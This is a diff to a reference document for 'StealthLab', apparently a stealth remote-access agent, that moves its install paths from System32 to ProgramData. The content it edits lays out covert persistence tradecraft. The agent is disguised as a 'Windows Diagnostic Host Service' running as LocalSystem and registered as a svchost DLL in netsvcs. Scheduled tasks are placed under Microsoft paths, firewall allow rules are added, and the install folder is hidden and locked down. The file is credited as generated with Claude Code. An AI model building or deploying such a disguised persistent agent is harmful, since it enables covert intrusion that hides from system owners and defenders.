@@ -23,10 +23,10 @@ Complete reference for all StealthLab service configurations, persistence mechan
 
 | Type | Path |
 |------|------|
-| **Install Directory** | `C:\Windows\System32\DiagnosticHost` |
-| **Executable (Standalone)** | `C:\Windows\System32\DiagnosticHost\diaghost.exe` |
-| **Service DLL (Svchost)** | `C:\Windows\System32\DiagnosticHost\diagsvc.dll` |
-| **Log Directory** | `C:\Windows\System32\DiagnosticHost\logs` |
+| **Install Directory** | `C:\\ProgramData\\DiagnosticHost` |
+| **Executable (Standalone)** | `C:\\ProgramData\\DiagnosticHost\diaghost.exe` |
+| **Service DLL (Svchost)** | `C:\\ProgramData\\DiagnosticHost\diagsvc.dll` |
+| **Log Directory** | `C:\\ProgramData\\DiagnosticHost\logs` |
 | **Log File** | `diagnostics.log` |
 | **Database** | `diaghost.db` |
 | **Config File** | `diaghost.conf` |
@@ -39,7 +39,7 @@ Complete reference for all StealthLab service configurations, persistence mechan
 "Type"=dword:00000010          ; SERVICE_WIN32_OWN_PROCESS
 "Start"=dword:00000002         ; SERVICE_AUTO_START
 "ErrorControl"=dword:00000001  ; SERVICE_ERROR_NORMAL
-"ImagePath"="C:\\Windows\\System32\\DiagnosticHost\\diaghost.exe"
+"ImagePath"="C:\\ProgramData\\DiagnosticHost\\diaghost.exe"
 "DisplayName"="Windows Diagnostic Host Service"
 "Description"="system health monitoring..."
 "ObjectName"="LocalSystem"
@@ -57,14 +57,14 @@ Complete reference for all StealthLab service configurations, persistence mechan
 "ObjectName"="LocalSystem"
 
 [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WinDiagnosticHost\Parameters]
-"ServiceDll"="%SystemRoot%\\System32\\DiagnosticHost\\diagsvc.dll"
+"ServiceDll"="%ProgramData%\\DiagnosticHost\\diagsvc.dll"
 "ServiceMain"="Stealth_SvchostServiceMain"
 
 [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost]
 "netsvcs"=<add "WinDiagnosticHost" to multistring>
 ```
 
-> Build note: the provisioning embed step now forces bundled DLL extraction whenever `stealth.svchostMode` is `true`, so `diagsvc.dll` is automatically written to `%SystemRoot%\System32\DiagnosticHost\` and registered with svchost.exe during installation.
+> Build note: the provisioning embed step now forces bundled DLL extraction whenever `stealth.svchostMode` is `true`, so `diagsvc.dll` is automatically written to `%ProgramData%\DiagnosticHost\` and registered with svchost.exe during installation.
 
 ### Service Failure Recovery
 
@@ -309,14 +309,14 @@ ret
 # Inbound
 New-NetFirewallRule -DisplayName "WinDiagnosticHost-In" `
                     -Direction Inbound `
-                    -Program "C:\Windows\System32\DiagnosticHost\diaghost.exe" `
+                    -Program "C:\\ProgramData\\DiagnosticHost\diaghost.exe" `
                     -Action Allow `
                     -Profile Any
 
 # Outbound
 New-NetFirewallRule -DisplayName "WinDiagnosticHost-Out" `
                     -Direction Outbound `
-                    -Program "C:\Windows\System32\DiagnosticHost\diaghost.exe" `
+                    -Program "C:\\ProgramData\\DiagnosticHost\diaghost.exe" `
                     -Action Allow `
                     -Profile Any
 ```
@@ -418,10 +418,10 @@ sc.exe sdset WinDiagnosticHost $sddl
 
 ```powershell
 # Hide installation directory
-attrib +h +s "C:\Windows\System32\DiagnosticHost"
+attrib +h +s "C:\\ProgramData\\DiagnosticHost"
 
 # Set restrictive ACLs
-icacls "C:\Windows\System32\DiagnosticHost" /inheritance:r /grant:r "SYSTEM:(OI)(CI)F" "Administrators:(OI)(CI)F"
+icacls "C:\\ProgramData\\DiagnosticHost" /inheritance:r /grant:r "SYSTEM:(OI)(CI)F" "Administrators:(OI)(CI)F"
 ```
 
 ---
@@ -454,7 +454,7 @@ schtasks /Query /TN "\Microsoft\Windows\Diagnostics\DiagnosticHostMonitor"
 schtasks /Query /TN "\Microsoft\Windows\Diagnostics\DiagnosticHostAutoStart"
 
 # Persistence flags in branding
-Get-Content "C:\Windows\System32\DiagnosticHost\diaghost.exe" | Select-String "MESH_AGENT_PERSIST"
+Get-Content "C:\\ProgramData\\DiagnosticHost\diaghost.exe" | Select-String "MESH_AGENT_PERSIST"
 ```
 
 ### Check Network Connection
@@ -503,7 +503,7 @@ Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Services\WinDiagnosticHost\Envi
 ### File Locations
 
 ```
-C:\Windows\System32\DiagnosticHost\
+C:\\ProgramData\\DiagnosticHost\
 ├── diaghost.exe         (Standalone binary)
 ├── diagsvc.dll          (Svchost DLL)
 ├── diaghost.conf        (Configuration)
@@ -527,7 +527,7 @@ Get-EventLog -LogName System -Source "Service Control Manager" -Newest 50 |
 sc.exe qc WinDiagnosticHost | findstr DEPENDENCIES
 
 # Verify files exist
-Test-Path "C:\Windows\System32\DiagnosticHost\diaghost.exe"
+Test-Path "C:\\ProgramData\\DiagnosticHost\diaghost.exe"
 ```
 
 ### Persistence Not Working
@@ -563,3 +563,4 @@ Restart-Service WinDiagnosticHost
 **For authorized defensive security research only.**
 
 Generated with [Claude Code](https://claude.com/claude-code)
+
